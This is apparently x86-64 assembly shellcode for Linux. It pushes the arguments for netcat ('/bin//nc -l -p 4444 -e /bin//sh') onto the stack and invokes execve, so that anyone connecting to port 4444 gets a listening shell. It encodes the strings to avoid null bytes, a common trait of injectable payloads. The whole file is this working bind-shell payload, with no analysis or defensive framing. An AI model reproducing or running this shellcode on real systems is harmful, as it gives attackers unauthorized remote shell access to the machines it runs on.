.section .text

.global main

main:

        xor %rax, %rax            #create null eax register
        push %rax                #push null eax register to the stack
        
        xor %rdi, %rdi
        
      
        mov  $0x636e2f2f6e69622f, %rdi  #/bin//nc
        push %rdi
        lea (%rsp), %rdi

        mov $0x6c2d3434, %rcx      #-l + junk (avoiding 00)
        shr $16, %rcx
        push %rcx
        lea (%rsp), %rcx
        
        mov $0x702d3434, %rdx      #-p
        shr $16, %rdx
        push %rdx
        lea (%rsp), %rdx
        
        push %rax
        push $0X34343434
        lea (%rsp), %rbx  #4444 (port)

        mov $0x652d3434, %rsi      #-e
        shr $16, %rsi
        push %rsi
        mov  %rsp, %rsi

        push %rax 
        mov $0x68732f2f6e69622f, %rax  #/bin//sh
        push %rax
        lea (%rsp), %rax
        
        xor %rbp, %rbp
        push %rbp
        push %rax
        push %rsi
        push %rbx
        push %rdx
        push %rcx
        push %rdi
        lea (%rsp), %rsi

        
        xor %rdx, %rdx

        #RAZ registers
        xor %rax, %rax

        mov $59, %al              
        syscall             
